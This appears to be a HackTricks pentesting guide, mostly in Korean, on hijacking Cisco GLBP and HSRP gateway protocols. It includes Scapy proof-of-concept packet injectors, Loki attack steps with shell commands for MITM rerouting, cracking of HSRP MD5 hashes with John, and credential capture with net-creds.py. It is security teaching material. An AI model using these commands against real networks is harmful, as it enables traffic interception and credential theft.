# GLBP & HSRP Attacks

{{#include ../../banners/hacktricks-training.md}}


## FHRP Hijacking Overview

### Insights into FHRP

FHRP는 여러 라우터를 하나의 가상 유닛으로 묶어 네트워크의 견고성, 부하 분산 및 장애 허용도를 향상시키도록 설계되었습니다. Cisco Systems는 이 계열에서 GLBP와 HSRP 같은 주요 프로토콜을 도입했습니다.

### GLBP Protocol Insights

Cisco가 만든 GLBP는 TCP/IP 스택에서 동작하며 통신을 위해 UDP 포트 3222를 사용합니다. GLBP 그룹의 라우터들은 3초 간격으로 "hello" 패킷을 교환합니다. 라우터가 10초 동안 이 패킷을 보내지 않으면 오프라인으로 간주됩니다. 다만 이 타이머들은 고정되어 있지 않으며 수정이 가능합니다.

GLBP for IPv6는 UDP/3222를 통해 멀티캐스트 **FF02::66**을 사용하며, 가상 MAC 형식은 `0007.b4xx.xxyy`가 됩니다 (AVF ID는 마지막 바이트에 포함). 타이밍과 공격 표면은 IPv4와 동일하므로, hijack techniques는 dual‑stack 네트워크에서도 작동합니다.

### GLBP Operations and Load Distribution

GLBP는 단일 가상 IP와 다수의 가상 MAC 주소를 사용해 라우터 간 부하 분산을 가능하게 한다는 점에서 돋보입니다. GLBP 그룹에서는 모든 라우터가 패킷 전달에 관여합니다. HSRP/VRRP와 달리 GLBP는 여러 메커니즘을 통해 실제적인 로드 밸런싱을 제공합니다:

- **Host-Dependent Load Balancing:** 호스트에 대해 일관된 AVF MAC 주소 할당을 유지하며, 안정적인 NAT 구성에 필수적입니다.
- **Round-Robin Load Balancing:** 기본 동작으로, 요청하는 호스트들 사이에서 AVF MAC 주소를 순환하여 할당합니다.
- **Weighted Round-Robin Load Balancing:** 미리 정의된 "Weight" 메트릭에 따라 부하를 분산합니다.

### Key Components and Terminologies in GLBP

- **AVG (Active Virtual Gateway):** MAC 주소를 할당하는 주 라우터입니다.
- **AVF (Active Virtual Forwarder):** 네트워크 트래픽을 처리하도록 지정된 라우터입니다.
- **GLBP Priority:** AVG를 결정하는 메트릭으로, 기본값은 100이며 1에서 255 사이입니다.
- **GLBP Weight:** 라우터의 현재 부하를 반영하며 수동으로 또는 Object Tracking을 통해 조정할 수 있습니다.
- **GLBP Virtual IP Address:** 네트워크에 연결된 모든 장치의 기본 게이트웨이로 사용됩니다.

상호작용을 위해 GLBP는 예약 멀티캐스트 주소 224.0.0.102와 UDP 포트 3222를 사용합니다. 라우터는 3초 간격으로 "hello" 패킷을 전송하며, 10초 동안 패킷을 받지 못하면 비작동으로 간주됩니다.

### GLBP Attack Mechanism

공격자는 우선순위 값을 최고값(255)으로 설정한 GLBP 패킷을 전송함으로써 주 라우터가 될 수 있습니다. 이로 인해 DoS 또는 MITM 공격이 발생할 수 있으며, 트래픽 가로채기나 리디렉션이 가능해집니다.

**실전 GLBP hijack with Scapy (short PoC)**
```python
from scapy.all import *

vip = "10.10.100.254"          # learned from sniffing
pkt = IP(dst="224.0.0.102")/UDP(dport=3222,sport=3222)/Raw(
b"\x01\x00\xff\x64"      # Version=1, Opcode=Hello, Priority=255, Weight=100
)
send(pkt, iface="eth0", loop=1, inter=1)
```
페이로드 바이트를 구성하여 GLBP header (version/opcode/priority/weight/VRID)를 모방한다. 프레임을 반복 전송하면 authentication이 없을 경우 AVG election에서 승리한다.

### Executing a GLBP Attack with Loki

[Loki](https://github.com/raizo62/loki_on_kali) can perform a GLBP attack by injecting a packet with priority and weight set to 255. 사전 공격 단계에서는 Wireshark 같은 도구를 사용해 virtual IP address, authentication 존재 여부, router priority 값 등을 수집한다.

Attack Steps:

1. Switch to promiscuous mode and enable IP forwarding.
2. Identify the target router and retrieve its IP.
3. Generate a Gratuitous ARP.
4. Inject a malicious GLBP packet, impersonating the AVG.
5. Assign a secondary IP address to the attacker's network interface, mirroring the GLBP virtual IP.
6. Implement SNAT for complete traffic visibility.
7. Adjust routing to ensure continued internet access through the original AVG router.

위 단계를 따르면, 공격자는 "man in the middle" 위치를 차지하여 unencrypted 또는 민감한 데이터를 포함한 네트워크 트래픽을 가로채고 분석할 수 있다.

For demonstration, here are the required command snippets:
```bash
# Enable promiscuous mode and IP forwarding
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1

# Configure secondary IP and SNAT
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Adjust routing
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
Monitoring and intercepting traffic can be done using net-creds.py or similar tools to capture and analyze data flowing through the compromised network.

### Passive Explanation of HSRP Hijacking with Command Details

#### Overview of HSRP (Hot Standby Router/Redundancy Protocol)

HSRP는 네트워크 게이트웨이 중복성을 위해 설계된 Cisco 독점 프로토콜입니다. 여러 물리적 라우터를 단일 논리 유닛으로 구성하여 공용 IP 주소를 공유할 수 있게 해줍니다. 이 논리 유닛은 트래픽을 제어하는 주 라우터에 의해 관리됩니다. 로드 밸런싱을 위해 priority나 weight 같은 메트릭을 사용하는 GLBP와 달리, HSRP는 트래픽 관리를 위해 단일 active 라우터에 의존합니다.

HSRPv1 uses multicast **224.0.0.2** and virtual MAC `0000.0c07.acXX`; HSRPv2 and HSRPv2 for IPv6 use **224.0.0.102 / FF02::66** and virtual MAC `0000.0c9f.fXXX`. UDP destination port is **1985** for IPv4 and **2029** for IPv6.

#### Roles and Terminology in HSRP

- **HSRP Active Router**: 게이트웨이 역할을 하며 트래픽 흐름을 관리하는 장치입니다.
- **HSRP Standby Router**: Active 라우터가 실패할 경우를 대비해 대기하는 백업 라우터입니다.
- **HSRP Group**: 단일 탄력적 가상 라우터를 형성하기 위해 협력하는 라우터들의 집합입니다.
- **HSRP MAC Address**: HSRP 설정에서 논리 라우터에 할당된 가상 MAC 주소입니다.
- **HSRP Virtual IP Address**: 연결된 장치들의 기본 게이트웨이로 동작하는 HSRP 그룹의 가상 IP 주소입니다.

#### HSRP Versions

HSRP는 주로 그룹 용량, 멀티캐스트 IP 사용, 가상 MAC 주소 구조에서 차이 나는 HSRPv1과 HSRPv2 두 버전으로 제공됩니다. 이 프로토콜은 서비스 정보를 교환하기 위해 특정 멀티캐스트 IP 주소를 사용하며, Hello 패킷은 매 3초마다 전송됩니다. 10초 이내에 패킷을 수신하지 못하면 해당 라우터는 비활성으로 간주됩니다.

#### HSRP Attack Mechanism

HSRP 공격은 최대 우선순위 값을 주입하여 Active Router의 역할을 강제로 탈취하는 방식으로 진행되며, 이는 Man-In-The-Middle (MITM) 공격으로 이어질 수 있습니다. 공격 전 필수 단계로는 HSRP 설정에 대한 정보 수집이 있으며, 이는 Wireshark 등으로 트래픽을 분석하여 수행할 수 있습니다.

**빠른 HSRP takeover with Scapy**
```python
from scapy.all import *

vip = "10.10.100.1"
pkt = IP(dst="224.0.0.102")/UDP(sport=1985,dport=1985)/Raw(
b"\x00\x02\xff\x03\x00\x00\x00\x01"  # Hello, priority 255, group 1
)
send(pkt, iface="eth0", inter=1, loop=1)
```
인증이 **구성되지 않은 경우**, 우선순위가 더 높은 hellos를 지속적으로 전송하면 피어를 *Speak*/*Listen* 상태로 강제하여 당신을 *Active*로 만들고 트래픽을 당신의 호스트로 리다이렉트할 수 있습니다.

**HSRP 인증의 예외 사례**

- 레거시 평문 auth는 매우 쉽게 스푸핑할 수 있습니다.
- MD5 인증은 HSRP 페이로드만 보호합니다; 특수 제작된 패킷은 여전히 제어 플레인을 레이트-리밋하거나 DoS를 일으킬 수 있습니다. 일부 NX-OS 릴리스는 인증된 그룹에 대해 DoS를 허용한 적이 있습니다(자세한 내용은 Cisco advisory CSCup11309 참조).
- 많은 ISP / VPS 공유 VLAN에서는 HSRPv1 멀티캐스트가 테넌트에게 보입니다; 인증이 없으면 참가하여 트래픽을 선점할 수 있습니다.

#### HSRP 인증 우회 단계

1. HSRP 데이터를 포함한 네트워크 트래픽을 .pcap 파일로 저장합니다.
```shell
tcpdump -w hsrp_traffic.pcap
```
2. hsrp2john.py를 사용해 .pcap 파일에서 MD5 해시를 추출합니다.
```shell
python2 hsrp2john.py hsrp_traffic.pcap > hsrp_hashes
```
3. John the Ripper로 MD5 해시를 크랙합니다.
```shell
john --wordlist=mywordlist.txt hsrp_hashes
```

**Loki로 HSRP 인젝션 실행**

1. Loki를 실행해 HSRP 어드버타이즈를 식별합니다.
2. 네트워크 인터페이스를 promiscuous 모드로 설정하고 IP 포워딩을 활성화합니다.
```shell
sudo ip link set eth0 promisc on
sudo sysctl -w net.ipv4.ip_forward=1
```
3. Loki를 사용해 특정 라우터를 타겟으로 설정하고, 크랙한 HSRP 비밀번호를 입력한 뒤 Active Router를 사칭하기 위한 필요한 설정을 수행합니다.
4. Active Router 역할을 얻은 후, 네트워크 인터페이스와 IP 테이블을 구성하여 정상 트래픽을 가로챕니다.
```shell
sudo ifconfig eth0:1 10.10.100.254 netmask 255.255.255.0
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```
5. 라우팅 테이블을 수정해 트래픽을 이전 Active Router를 통해 라우팅합니다.
```shell
sudo route del default
sudo route add -net 0.0.0.0 netmask 0.0.0.0 gw 10.10.100.100
```
6. 가로챈 트래픽에서 자격증명(credentials)을 캡처하기 위해 net-creds.py 또는 유사 유틸리티를 사용합니다.
```shell
sudo python2 net-creds.py -i eth0
```

이러한 단계를 수행하면 공격자는 GLBP 하이재킹 절차와 유사하게 트래픽을 가로채고 조작할 수 있는 위치에 놓이게 됩니다. 이는 HSRP 같은 중복성 프로토콜의 취약성과 강력한 보안 조치의 필요성을 강조합니다.

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- [Cisco NX-OS HSRP authentication DoS (CSCup11309)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/Cisco-SA-20140611-CVE-2014-3295)
- [Reddit: HSRP seen on VPS shared VLANs](https://www.reddit.com/r/networking/comments/1h0v1aq/hsrp_seen_on_cloud_vlans_without_auth/)
{{#include ../../banners/hacktricks-training.md}}
